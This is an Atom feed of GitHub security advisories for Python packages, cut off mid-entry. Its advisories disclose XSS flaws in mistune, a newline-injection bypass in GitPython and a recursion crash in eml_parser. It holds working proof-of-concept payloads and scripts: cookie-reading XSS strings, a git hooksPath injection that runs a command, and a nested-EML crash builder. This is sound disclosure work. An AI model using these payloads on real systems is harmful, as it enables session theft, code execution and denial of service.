<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-05-09T05:01:19.196Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune Heading ID Attribute has Injection XSS]]></title>
        <id>https://github.com/advisories/GHSA-v87v-83h2-53w7</id>
        <link href="https://github.com/advisories/GHSA-v87v-83h2-53w7"/>
        <updated>2026-05-09T00:13:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>HTMLRenderer.heading()</code> builds the opening <code>&lt;hN&gt;</code> tag by string-concatenating the <code>id</code> attribute value directly into the HTML — with no call to <code>escape()</code>, <code>safe_entity()</code>, or any other sanitisation function. A double-quote character <code>"</code> in the <code>id</code> value terminates the attribute, allowing an attacker to inject arbitrary additional attributes (event handlers, <code>src=</code>, <code>href=</code>, etc.) into the heading element.</p>
<p>The default TOC hook assigns safe auto-incremented IDs (<code>toc_1</code>, <code>toc_2</code>, …) that never contain user text. However, the <code>add_toc_hook()</code> API accepts a caller-supplied <code>heading_id</code> callback. Deriving heading IDs from the heading text itself — to produce human-readable slug anchors like <code>#installation</code> or <code>#getting-started</code> — is by far the most common real-world usage of this callback (every major documentation generator does this). When the callback returns raw heading text, an attacker who controls heading content can break out of the <code>id=</code> attribute.</p>
<h2 id="details">Details</h2>
<p><strong>File:</strong> <code>src/mistune/renderers/html.py</code></p>
<pre><code class="language-python">def heading(self, text: str, level: int, **attrs: Any) -&gt; str:
    tag = "h" + str(level)
    html = "&lt;" + tag
    _id = attrs.get("id")
    if _id:
        html += ' id="' + _id + '"'    # ← _id is never escaped
    return html + "&gt;" + text + "&lt;/" + tag + "&gt;\n"
</code></pre>
<p>The <code>text</code> body (line content) <em>is</em> escaped upstream by the inline token renderer, which is why <code>text</code> arrives as <code>&amp;quot;</code> etc. But <code>_id</code> arrives as a raw string directly from whatever the <code>heading_id</code> callback returned — no escaping occurs at any point in the pipeline.</p>
<h2 id="poc">PoC</h2>
<p><strong>Step 1 — Establish the baseline (safe default IDs)</strong></p>
<p>The script creates a parser with <code>escape=True</code> and the default <code>add_toc_hook()</code> (no custom <code>heading_id</code> callback). The default hook generates sequential numeric IDs:</p>
<pre><code class="language-python">md_safe = create_markdown(escape=True)
add_toc_hook(md_safe)          # default: heading_id produces toc_1, toc_2, …

bl_src = "## Introduction\n"
bl_out, _ = md_safe.parse(bl_src)
</code></pre>
<p>Output — ID is auto-generated, no user text appears in it:</p>
<pre><code class="language-html">&lt;h2 id="toc_1"&gt;Introduction&lt;/h2&gt;
</code></pre>
<p><strong>Step 2 — Add the realistic trigger: a text-based <code>heading_id</code> callback</strong></p>
<p>Deriving an anchor ID from the heading text is the standard real-world pattern (slugifiers, <code>mkdocs</code>, <code>sphinx</code>, <code>jekyll</code> all do this). The PoC uses the simplest possible version — return the raw heading text unchanged — to show the vulnerability without any extra transformation:</p>
<pre><code class="language-python">def raw_id(token, index):
    return token.get("text", "")   # returns raw heading text as the ID

md_vuln = create_markdown(escape=True)
add_toc_hook(md_vuln, heading_id=raw_id)
</code></pre>
<p><strong>Step 3 — Craft the exploit payload</strong></p>
<p>Construct a heading whose text contains a double-quote followed by an injected attribute:</p>
<pre><code>## foo" onmouseover="alert(document.cookie)" x="
</code></pre>
<p>When <code>raw_id</code> is called, <code>token["text"]</code> is <code>foo" onmouseover="alert(document.cookie)" x="</code>. This is passed verbatim to <code>heading()</code> as the <code>id</code> attribute value.</p>
<p><strong>Step 4 — Observe attribute breakout in the output</strong></p>
<pre><code class="language-python">ex_src = '## foo" onmouseover="alert(document.cookie)" x="\n'
ex_out, _ = md_vuln.parse(ex_src)
</code></pre>
<p>Actual output:</p>
<pre><code class="language-html">&lt;h2 id="foo" onmouseover="alert(document.cookie)" x=""&gt;foo&amp;quot; onmouseover=&amp;quot;alert(document.cookie)&amp;quot; x=&amp;quot;&lt;/h2&gt;
</code></pre>
<p>Note: the heading <strong>body text</strong> is correctly escaped (<code>&amp;quot;</code>), but the <strong><code>id=</code> attribute</strong> is not. A user who moves their mouse over the heading triggers <code>alert(document.cookie)</code>. Any JavaScript payload can be substituted.</p>
<h3 id="script">Script</h3>
<p>A verification script was created to verify this issue. It creates a HTML page showing the bypass rendering in the browser.</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""H2: HTMLRenderer.heading() inserts the id= value verbatim — no escaping."""
import os, html as h
from mistune import create_markdown
from mistune.toc import add_toc_hook

def raw_id(token, index):
    return token.get("text", "")

# --- baseline ---
md_safe = create_markdown(escape=True)
add_toc_hook(md_safe)

bl_file = "baseline_h2.md"
bl_src  = "## Introduction\n"
with open(os.path.join(os.getcwd(), bl_file), "w") as f:
    f.write(bl_src)
bl_out, _ = md_safe.parse(bl_src)

print(f"[{bl_file}]\n{bl_src}")
print("[output — id=toc_1, no user content, safe]")
print(bl_out)

# --- exploit ---
md_vuln = create_markdown(escape=True)
add_toc_hook(md_vuln, heading_id=raw_id)

ex_file = "exploit_h2.md"
ex_src  = '## foo" onmouseover="alert(document.cookie)" x="\n'
with open(os.path.join(os.getcwd(), ex_file), "w") as f:
    f.write(ex_src)
ex_out, _ = md_vuln.parse(ex_src)

print(f"[{ex_file}]\n{ex_src}")
print("[output — heading_id returns raw text, id= not escaped]")
print(ex_out)

# --- HTML report ---
CSS = """
body{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}
h1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}
p.desc{color:#555;font-size:.9em;margin-top:6px}
.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;box-shadow:0 1px 4px rgba(0,0,0,.1)}
.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}
.baseline .case-header{background:#d1fae5;color:#065f46}
.exploit  .case-header{background:#fee2e2;color:#7f1d1d}
.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}
.panel{padding:16px}
.panel+.panel{border-left:1px solid #eee}
.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}
pre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;font-size:.78em;white-space:pre-wrap;word-break:break-all}
.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}
.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;background:#fff;font-size:.9em}
"""

def case(kind, label, filename, src, out):
    return f"""
&lt;div class="case {kind}"&gt;
  &lt;div class="case-header"&gt;{'BASELINE' if kind=='baseline' else 'EXPLOIT'} — {h.escape(label)}&lt;/div&gt;
  &lt;div class="panels"&gt;
    &lt;div class="panel"&gt;
      &lt;h3&gt;Input — {h.escape(filename)}&lt;/h3&gt;
      &lt;pre&gt;{h.escape(src)}&lt;/pre&gt;
    &lt;/div&gt;
    &lt;div class="panel"&gt;
      &lt;h3&gt;Output — HTML source&lt;/h3&gt;
      &lt;pre&gt;{h.escape(out)}&lt;/pre&gt;
      &lt;div class="rlabel"&gt;↓ rendered in browser (hover the heading to trigger onmouseover)&lt;/div&gt;
      &lt;div class="rendered"&gt;{out}&lt;/div&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;"""

page = f"""&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;
&lt;title&gt;H2 — Heading ID XSS&lt;/title&gt;&lt;style&gt;{CSS}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;H2 — Heading ID XSS (unescaped id= attribute)&lt;/h1&gt;
&lt;p class="desc"&gt;HTMLRenderer.heading() in renderers/html.py does html += ' id="' + _id + '"' with no escaping.
Triggered when heading_id callback returns raw heading text — the most common doc-generator pattern.&lt;/p&gt;
{case("baseline", "Clean heading → sequential id=toc_1, safe", bl_file, bl_src, bl_out)}
{case("exploit",  "Malicious heading → quotes break out of id=, onmouseover injected", ex_file, ex_src, ex_out)}
&lt;/body&gt;&lt;/html&gt;"""

out_path = os.path.join(os.getcwd(), "report_h2.html")
with open(out_path, "w") as f:
    f.write(page)
print(f"\n[report] {out_path}")
</code></pre>
<p>Example Usage:</p>
<pre><code class="language-bash">python poc.py
</code></pre>
<p>Once the script is run, open <code>report_h2.html</code> in the browser and observe the behaviour.</p>
<h2 id="impact">Impact</h2>
<table>
<thead>
<tr>
<th>Dimension</th>
<th>Assessment</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Confidentiality</strong></td>
<td>Session cookie / auth token theft via JavaScript execution triggered on mouse interaction</td>
</tr>
<tr>
<td><strong>Integrity</strong></td>
<td>DOM manipulation, phishing content injection, forced navigation</td>
</tr>
<tr>
<td><strong>Availability</strong></td>
<td>Page freeze or crash available to attacker</td>
</tr>
</tbody></table>
<p><strong>Risk context:</strong> This vulnerability targets the most common customisation point for heading IDs. Any documentation site, wiki, or blog engine that generates slug-style anchors from heading text is vulnerable if it uses mistune's <code>heading_id</code> callback without independently sanitising the returned value.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-v87v-83h2-53w7">https://github.com/lepture/mistune/security/advisories/GHSA-v87v-83h2-53w7</a></li>
<li><a href="https://github.com/advisories/GHSA-v87v-83h2-53w7">https://github.com/advisories/GHSA-v87v-83h2-53w7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v87v-83h2-53w7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-09T00:13:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune has XSS via unescaped figclass/figwidth in Figure directive]]></title>
        <id>https://github.com/advisories/GHSA-58cw-g322-p94v</id>
        <link href="https://github.com/advisories/GHSA-58cw-g322-p94v"/>
        <updated>2026-05-08T23:43:12.000Z</updated>
        <content type="html"><![CDATA[<p>In <code>src/mistune/directives/image.py</code>, the <code>render_figure()</code> function concatenates <code>figclass</code> and <code>figwidth</code> options directly into HTML attributes without escaping (lines 152-168).</p>
<p>This allows attribute injection and XSS even when <code>HTMLRenderer(escape=True)</code> is used, because these values bypass the inline renderer.</p>
<p>Other attributes in the same file (src, alt, style) are properly escaped; figclass/figwidth were missed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-58cw-g322-p94v">https://github.com/lepture/mistune/security/advisories/GHSA-58cw-g322-p94v</a></li>
<li><a href="https://github.com/advisories/GHSA-58cw-g322-p94v">https://github.com/advisories/GHSA-58cw-g322-p94v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-58cw-g322-p94v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-08T23:43:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mistune] Mistune Math Plugin has an XSS Escape Bypass]]></title>
        <id>https://github.com/advisories/GHSA-8g87-j6q8-g93x</id>
        <link href="https://github.com/advisories/GHSA-8g87-j6q8-g93x"/>
        <updated>2026-05-08T23:40:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The mistune math plugin renders inline math (<code>$...$</code>) and block math (<code>$$...$$</code>) by concatenating the raw user-supplied content directly into the HTML output <strong>without any HTML escaping</strong>. This occurs even when the parser is explicitly created with <code>escape=True</code>, which is supposed to guarantee that all user-controlled text is sanitised before reaching the DOM.</p>
<p>The result is a silent contract violation: a developer who enables <code>escape=True</code> reasonably expects complete XSS protection, but the math plugin operates as an independent render path that ignores the renderer's <code>_escape</code> flag entirely.</p>
<h2 id="details">Details</h2>
<p><strong>File:</strong> <code>src/mistune/plugins/math.py</code></p>
<pre><code class="language-python">def render_inline_math(renderer, text):
    # `text` is raw user input — no escape() call anywhere
    return r'&lt;span class="math"&gt;\(' + text + r"\)&lt;/span&gt;"

def render_block_math(renderer, text):
    # same issue for block-level $$...$$
    return '&lt;div class="math"&gt;$$\n' + text + "\n$$&lt;/div&gt;\n"
</code></pre>
<p>Both functions take <code>text</code> directly from the parsed token and concatenate it into the output string. Neither function:</p>
<ul>
<li>calls <code>escape(text)</code> from <code>mistune.util</code></li>
<li>checks <code>renderer._escape</code></li>
<li>calls <code>safe_entity(text)</code> or any other sanitisation helper</li>
</ul>
<p>The <code>escape=True</code> flag only influences the main <code>HTMLRenderer</code> methods (<code>paragraph</code>, <code>heading</code>, <code>codespan</code>, etc.). Plugin render functions registered via <code>md.renderer.register()</code> receive the <code>renderer</code> instance but have no mechanism that enforces the escape contract - they must opt in manually, and <code>math.py</code> does not.</p>
<h2 id="poc">PoC</h2>
<p><strong>Step 1 — Establish the baseline (escape=True works for plain HTML)</strong></p>
<p>The script creates a markdown parser with <code>escape=True</code> and the math plugin enabled, then feeds it a raw <code>&lt;script&gt;</code> tag that is <em>not</em> inside math delimiters:</p>
<pre><code class="language-python">md = create_markdown(escape=True, plugins=["math"])
bl_src = "&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n"
bl_out = str(md(bl_src))
</code></pre>
<p>Expected and actual output — the script tag is correctly escaped:</p>
<pre><code class="language-html">&lt;p&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/p&gt;
</code></pre>
<p>This confirms <code>escape=True</code> is working for the normal render path.</p>
<p><strong>Step 2 — Craft the exploit payload</strong></p>
<p>Wrap the identical <code>&lt;script&gt;</code> payload inside inline math delimiters <code>$...$</code>. The content is token-extracted as <code>text</code> and handed to <code>render_inline_math()</code>:</p>
<pre><code class="language-python">ex_src = "$&lt;script&gt;alert(document.cookie)&lt;/script&gt;$\n"
ex_out = str(md(ex_src))
</code></pre>
<p><strong>Step 3 — Observe the bypass</strong></p>
<p>Actual output — the script tag is emitted raw, unescaped:</p>
<pre><code class="language-html">&lt;p&gt;&lt;span class="math"&gt;\(&lt;script&gt;alert(document.cookie)&lt;/script&gt;\)&lt;/span&gt;&lt;/p&gt;
</code></pre>
<p>The <code>&lt;script&gt;</code> block is live inside the <code>&lt;span class="math"&gt;</code> wrapper. Any browser that renders this HTML will execute <code>alert(document.cookie)</code>.</p>
<p><strong>Step 4 — Block math variant (<code>$$...$$</code>)</strong></p>
<p>The same bypass applies to block-level math. Payload:</p>
<pre><code>$$
&lt;img src=x onerror="alert(document.cookie)"&gt;
$$
</code></pre>
<p>Output:</p>
<pre><code class="language-html">&lt;div class="math"&gt;$$
&lt;img src=x onerror="alert(document.cookie)"&gt;
$$&lt;/div&gt;
</code></pre>
<p>The <code>onerror</code> handler fires as soon as the browser tries to load the non-existent image <code>x</code>.</p>
<h3 id="script">Script</h3>
<p>A verification script was written to test this issue. It creates a HTML page showing the bypass rendering in the browser.</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""H1: Math plugin bypasses escape=True — HTML inside $...$ passes through raw."""
import os, html as h
from mistune import create_markdown

md = create_markdown(escape=True, plugins=["math"])

# --- baseline ---
bl_file = "baseline_h1.md"
bl_src  = "&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n"
with open(os.path.join(os.getcwd(), bl_file), "w") as f:
    f.write(bl_src)
bl_out = str(md(bl_src))

print(f"[{bl_file}]\n{bl_src}")
print("[output — escape=True works normally here]")
print(bl_out)

# --- exploit ---
ex_file = "exploit_h1.md"
ex_src  = "$&lt;script&gt;alert(document.cookie)&lt;/script&gt;$\n"
with open(os.path.join(os.getcwd(), ex_file), "w") as f:
    f.write(ex_src)
ex_out = str(md(ex_src))

print(f"[{ex_file}]\n{ex_src}")
print("[output — escape=True bypassed inside math delimiters]")
print(ex_out)

# --- HTML report ---
CSS = """
body{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}
h1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}
p.desc{color:#555;font-size:.9em;margin-top:6px}
.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;box-shadow:0 1px 4px rgba(0,0,0,.1)}
.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}
.baseline .case-header{background:#d1fae5;color:#065f46}
.exploit  .case-header{background:#fee2e2;color:#7f1d1d}
.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}
.panel{padding:16px}
.panel+.panel{border-left:1px solid #eee}
.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}
pre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;font-size:.78em;white-space:pre-wrap;word-break:break-all}
.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}
.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;background:#fff;font-size:.9em}
"""

def case(kind, label, filename, src, out):
    return f"""
&lt;div class="case {kind}"&gt;
  &lt;div class="case-header"&gt;{'BASELINE' if kind=='baseline' else 'EXPLOIT'} — {h.escape(label)}&lt;/div&gt;
  &lt;div class="panels"&gt;
    &lt;div class="panel"&gt;
      &lt;h3&gt;Input — {h.escape(filename)}&lt;/h3&gt;
      &lt;pre&gt;{h.escape(src)}&lt;/pre&gt;
    &lt;/div&gt;
    &lt;div class="panel"&gt;
      &lt;h3&gt;Output — HTML source&lt;/h3&gt;
      &lt;pre&gt;{h.escape(out)}&lt;/pre&gt;
      &lt;div class="rlabel"&gt;↓ rendered in browser&lt;/div&gt;
      &lt;div class="rendered"&gt;{out}&lt;/div&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;"""

page = f"""&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;
&lt;title&gt;H1 — Math XSS&lt;/title&gt;&lt;style&gt;{CSS}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;H1 — Math Plugin XSS (escape=True bypass)&lt;/h1&gt;
&lt;p class="desc"&gt;render_inline_math() in plugins/math.py concatenates user content without escape().
The escape=True renderer flag is completely ignored inside $...$ delimiters.&lt;/p&gt;
{case("baseline", "Same HTML outside $...$  — escape=True works", bl_file, bl_src, bl_out)}
{case("exploit",  "Same HTML inside $...$   — escape=True bypassed", ex_file, ex_src, ex_out)}
&lt;/body&gt;&lt;/html&gt;"""

out_path = os.path.join(os.getcwd(), "report_h1.html")
with open(out_path, "w") as f:
    f.write(page)
print(f"\n[report] {out_path}")
</code></pre>
<p>Example usage:</p>
<pre><code class="language-bash">python poc.py
</code></pre>
<p>Once the script is run, open <code>report_h1.html</code> in the browser and observe the behaviour.</p>
<h2 id="impact">Impact</h2>
<table>
<thead>
<tr>
<th>Dimension</th>
<th>Assessment</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Confidentiality</strong></td>
<td>Attacker can exfiltrate session cookies, auth tokens, and any data visible to the victim's browser session</td>
</tr>
<tr>
<td><strong>Integrity</strong></td>
<td>Attacker can mutate page content, inject phishing forms, redirect the user, or perform authenticated actions</td>
</tr>
<tr>
<td><strong>Availability</strong></td>
<td>Attacker can crash or freeze the page (denial-of-service to the user)</td>
</tr>
</tbody></table>
<p><strong>Risk amplifier:</strong> This is a <em>bypass</em> of an explicit security control. Developers who have audited their application and confirmed <code>escape=True</code> is set believe they have XSS protection. This vulnerability silently invalidates that assumption for every math-enabled parser instance, making it likely to be missed in code reviews and security audits.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-8g87-j6q8-g93x">https://github.com/lepture/mistune/security/advisories/GHSA-8g87-j6q8-g93x</a></li>
<li><a href="https://github.com/advisories/GHSA-8g87-j6q8-g93x">https://github.com/advisories/GHSA-8g87-j6q8-g93x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8g87-j6q8-g93x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-08T23:40:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Newline injection in config_writer() section parameter bypasses CVE-2026-42215 patch, enabling RCE via core.hooksPath]]></title>
        <id>https://github.com/advisories/GHSA-mv93-w799-cj2w</id>
        <link href="https://github.com/advisories/GHSA-mv93-w799-cj2w"/>
        <updated>2026-05-08T23:19:59.000Z</updated>
        <content type="html"><![CDATA[<p>Summary</p>
<p>The patch for CVE-2026-42215 (GitPython 3.1.49) validates newlines only in the value parameter of set_value(). The section and option parameters are passed to configparser without any newline validation. An attacker who controls the section argument can inject \n to write arbitrary section headers into .git/config, including a forged [core] section with hooksPath pointing to an attacker-controlled directory, leading to RCE when any git hook is triggered.</p>
<p>Details</p>
<p>File: git/config.py — GitPython 3.1.49 (latest patched version)</p>
<pre><code class="language-python">  def set_value(self, section: str, option: str, value) -&gt; "GitConfigParser":
      value_str = self._value_to_string_safe(value)   # only value is validated
      if not self.has_section(section):
          self.add_section(section)                    # section not validated
      super().set(section, option, value_str)          # option not validated
      return self
</code></pre>
<p>_write() formats section headers as "[%s]\n" % name. When section = "user]\n[core", this writes [user]\n[core]\n — two valid section headers — into .git/config.</p>
<p>PoC</p>
<pre><code class="language-python">  import git, os, subprocess

  repo = git.Repo.init("/tmp/bypass_test")

  os.makedirs("/tmp/evil_hooks", exist_ok=True)
  with open("/tmp/evil_hooks/pre-commit", "w") as f:
      f.write("#!/bin/sh\nid &gt; /tmp/rce_proof.txt\n")
  os.chmod("/tmp/evil_hooks/pre-commit", 0o755)

  # Inject newline into section parameter (not value — already patched)
  with repo.config_writer() as cw:
      cw.set_value("user]\n[core", "hooksPath", "/tmp/evil_hooks")

  r = subprocess.run(["git", "-C", "/tmp/bypass_test", "config", "core.hooksPath"],
                     capture_output=True, text=True)
  print(r.stdout.strip())  # → /tmp/evil_hooks

  subprocess.run(["git", "-C", "/tmp/bypass_test", "commit", "--allow-empty", "-m", "x"])
  print(open("/tmp/rce_proof.txt").read())  # → uid=1000(...) RCE confirmed
</code></pre>
<p>Impact</p>
<p>Same attack outcome as CVE-2026-42215 (RCE via core.hooksPath injection). The patch is incomplete — only value is validated while section and option remain injectable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-mv93-w799-cj2w">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-mv93-w799-cj2w</a></li>
<li><a href="https://github.com/advisories/GHSA-rpm5-65cw-6hj4">https://github.com/advisories/GHSA-rpm5-65cw-6hj4</a></li>
<li><a href="https://github.com/advisories/GHSA-mv93-w799-cj2w">https://github.com/advisories/GHSA-mv93-w799-cj2w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mv93-w799-cj2w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-08T23:19:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[paramiko] Paramiko rsakey.py allows the SHA-1 algorithm]]></title>
        <id>https://github.com/advisories/GHSA-r374-rxx8-8654</id>
        <link href="https://github.com/advisories/GHSA-r374-rxx8-8654"/>
        <updated>2026-05-08T23:13:43.000Z</updated>
        <content type="html"><![CDATA[<p>In Paramiko through 4.0.0 before a448945, rsakey.py allows the SHA-1 algorithm.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44405">https://nvd.nist.gov/vuln/detail/CVE-2026-44405</a></li>
<li><a href="https://github.com/paramiko/paramiko/commit/a4489456b6f65281e172380cc4826cee5e851dbb">https://github.com/paramiko/paramiko/commit/a4489456b6f65281e172380cc4826cee5e851dbb</a></li>
<li><a href="https://ostif.org/wp-content/uploads/2026/05/25-11-2415-REP_paramiko-security-audit_v1.1.pdf">https://ostif.org/wp-content/uploads/2026/05/25-11-2415-REP_paramiko-security-audit_v1.1.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-r374-rxx8-8654">https://github.com/advisories/GHSA-r374-rxx8-8654</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r374-rxx8-8654</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-06T00:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[eml_parser] eml_parser has recursion DoS via nested message/rfc822 attachments]]></title>
        <id>https://github.com/advisories/GHSA-g47v-rwmh-r9f8</id>
        <link href="https://github.com/advisories/GHSA-g47v-rwmh-r9f8"/>
        <updated>2026-05-08T23:12:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>EmlParser.get_raw_body_text()</code> recurses unconditionally for every nested <code>message/rfc822</code> attachment without any depth limit. An attacker who can supply a badly crafted EML file with approximately 120 nested <code>message/rfc822</code> parts triggers an unhandled <code>RecursionError</code> and aborts parsing of the message. A 12 KB EML file is enough to crash a worker.
Though this causes the parser to crash, it is an unlikely scenario as the suggested EML that crashes the parser would not pass basic RFC compliance tests.</p>
<h3 id="details">Details</h3>
<p>The vulnerable function is <code>EmlParser.get_raw_body_text()</code> in <code>eml_parser/parser.py</code>. For every part of type <code>multipart/*</code>, the function iterates over its sub-parts; for every sub-part of type <code>message/rfc822</code>, it calls itself recursively on the inner message:</p>
<p>There is no depth parameter and no early-abort. CPython's default <code>sys.recursionlimit</code> is 1000. Each level of <code>message/rfc822</code> nesting adds approximately 8 frames to the stack (parser code + stdlib <code>_header_value_parser</code> calls), so roughly 120 nested levels exhaust the limit.</p>
<p>The <code>RecursionError</code> is not caught anywhere along the call chain, so it propagates out of <code>decode_email_bytes()</code> and aborts processing of the entire message.</p>
<h3 id="poc">PoC</h3>
<p>Environment: Python 3.12.3, eml_parser 3.0.0 (<code>pip install eml_parser==3.0.0</code>), default <code>sys.recursionlimit=1000</code>, Ubuntu 24.04 aarch64. No special configuration of <code>EmlParser</code>, default constructor.</p>
<p>Self-contained reproducer that builds the PoC and triggers the crash:</p>
<pre><code class="language-python">import eml_parser

def build_poc(depth=124):
    inner = b"From: a@a\r\nTo: b@b\r\nContent-Type: text/plain\r\n\r\n.\r\n"
    msg = inner
    for i in range(depth):
        b = f"B{i}".encode()
        msg = (
            b'Content-Type: multipart/mixed; boundary="' + b + b'"\r\n\r\n'
            b'--' + b + b'\r\nContent-Type: message/rfc822\r\n\r\n'
        ) + msg + b'\r\n--' + b + b'--\r\n'
    return msg

ep = eml_parser.EmlParser()
ep.decode_email_bytes(build_poc())
# RecursionError after ~76 ms on Apple Silicon (Ubuntu 24.04 aarch64).
</code></pre>
<p>Note that the suggested code does not produce an RFC compliant message.
Resulting EML payload size: 12,369 bytes.
SHA-256 of generated PoC: <code>00f15f635e21b4144967c2893b37425e6a6bd7b4185c557e5c7e904e1e6d18e8</code></p>
<p>The crash is deterministic on a stock install. No network, no special headers, no large attachments.</p>
<h3 id="impact">Impact</h3>
<p>Denial of service of any pipeline that processes attacker-supplied EML files using <code>eml_parser</code>.</p>
<p>A single 12 KB email is enough to crash a worker. If the worker is a long-running process triaging multiple emails, the unhandled exception aborts processing of the whole batch unless the caller wraps the call in a broad <code>try/except</code>. Even then, attacker-supplied volume can keep workers in a perpetual restart loop.</p>
<p>The vulnerability is exploitable pre-authentication in any deployment that ingests emails from external senders which have not been subject to any kind of basic validation.
Considering that email messages pass through a mail-server which does some kind of validation, messages as produced by the  <em>build_poc</em> function would not reach eml_parser.
Nonetheless recursion depth checks have been implemented to handle the described issue.</p>
<h3 id="reporter">Reporter</h3>
<p>Sebastián Alba Vives (<code>@Sebasteuo</code>)
Independent security researcher, Senior AppSec Consultant
LinkedIn: <a href="https://www.linkedin.com/in/sebastian-alba">https://www.linkedin.com/in/sebastian-alba</a>
Email: <a href="mailto:sebasjosue84@gmail.com">sebasjosue84@gmail.com</a>
PGP: <code>0D1A E4C2 CFC8 894F 19EA  DA24 45CD CA33 2CF8 31F4</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GOVCERT-LU/eml_parser/security/advisories/GHSA-g47v-rwmh-r9f8">https://github.com/GOVCERT-LU/eml_parser/security/advisories/GHSA-g47v-rwmh-r9f8</a></li>
<li><a href="https://github.com/advisories/GHSA-g47v-rwmh-r9f8">https://github.com/advisories/GHSA-g47v-rwmh-r9f8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g47v-rwmh-r9f8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-08T23:12:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ironic-python-agent] OpenStack Ironic has an Incorrect Resource Transfer Between Spheres]]></title>
        <id>https://github.com/advisories/GHSA-54w4-233h-x86g</id>
        <link href="https://github.com/advisories/GHSA-54w4-233h-x86g"/>
        <updated>2026-05-08T23:07:57.000Z</updated>
